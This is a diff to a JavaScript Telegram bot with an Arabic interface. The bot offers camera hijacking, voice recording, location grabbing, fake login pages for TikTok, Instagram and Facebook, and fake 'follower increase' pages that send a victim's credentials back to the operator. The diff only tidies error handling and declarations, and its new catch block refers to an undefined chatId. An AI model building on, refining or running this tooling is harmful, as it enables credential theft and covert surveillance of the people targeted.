@@ -768,19 +768,24 @@ bot.on('message', async (msg) => {
   const text = msg.text ? msg.text.toLowerCase() : '';
   const senderId = msg.from.id;
 
-  if (text === '/start') {
-    showDefaultButtons(senderId);
-  } else if (text === '/login') {
-    showLoginButtons(senderId);
-  } else if (text === '/hacking') {
-    showHackingButtons(senderId);
+  try {
+    if (text === '/start') {
+      showDefaultButtons(senderId);
+    } else if (text === '/login') {
+      showLoginButtons(senderId);
+    } else if (text === '/hacking') {
+      showHackingButtons(senderId);
+    }
+  } catch (error) {
+    console.error('Error handling message:', error);
+    bot.sendMessage(chatId, 'حدث خطأ أثناء معالجة طلبك.');
   }
 });
 
 function showDefaultButtons(userId) {
-  let statusMessage = `قم بجمع نقاط كافية لاستخدام البوت مجانًا ارسل امر لاضهار اندكسات تسجيل دخول /login اكتب امر لاضهور اندكسات صفحات مزوره على شكل زياده متابعين /hacking.`;
+  const statusMessage = `قم بجمع نقاط كافية لاستخدام البوت مجانًا ارسل امر لاضهار اندكسات تسجيل دخول /login اكتب امر لاضهور اندكسات صفحات مزوره على شكل زياده متابعين /hacking.`;
 
-  let defaultButtons = [
+  const defaultButtons = [
     [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data: 'front_camera' }],
     [{ text: '🎙 تسجيل صوت 🎙', callback_data: 'voice_record' }],
     [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data: 'get_location' }],
@@ -794,11 +799,11 @@ function showDefaultButtons(userId) {
     reply_markup: {
       inline_keyboard: defaultButtons
     }
-  });
+  }).catch(error => console.error('Error sending showButtons message:', error));
 }
 
 function showLoginButtons(userId) {
-  let loginButtons = [
+  const loginButtons = [
     [{ text: ' 🎵اندكس تسجيل دخول تيك توك 🎵 ', callback_data: 'login_tiktok' }],
     [{ text: ' 📸اندكس تسجيل دخول انستقرام 📸', callback_data: 'login_instagram' }],
     [{ text: ' 📘اندكس تسجيل دخول فيسبوك 📘', callback_data: 'login_facebook' }],
@@ -810,11 +815,11 @@ function showLoginButtons(userId) {
     reply_markup: {
       inline_keyboard: loginButtons
     }
-  });
+  }).catch(error => console.error('Error sending showLoginButtons message:', error));
 }
 
 function showHackingButtons(userId) {
-  let hackingButtons = [
+  const hackingButtons = [
     [{ text: '☠️ اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
     [{ text: '🕷 اختراق الانستغرام 🕷', callback_data: 'increase_instagram' }],
     [{ text: '🔱 اختراق الفيسبوك 🔱', callback_data: 'increase_facebook' }],
@@ -824,11 +829,11 @@ function showHackingButtons(userId) {
     [{ text: '🐦 اختراق تويتر 🐦', callback_data: 'increase_twitter' }],
   ];
 
-  bot.sendMessage(userId, `اختر  اندكسات على شكل زياده متابعين  عند قيام الضحيه بتسجيل  لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
+  bot.sendMessage(userId, `اختر اندكسات على شكل زياده متابعين عند قيام الضحيه بتسجيل لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
     reply_markup: {
       inline_keyboard: hackingButtons
     }
-  });
+  }).catch(error => console.error('Error sending showHackingButtons message:', error));
 }
 // ... (باقي الكود)
 
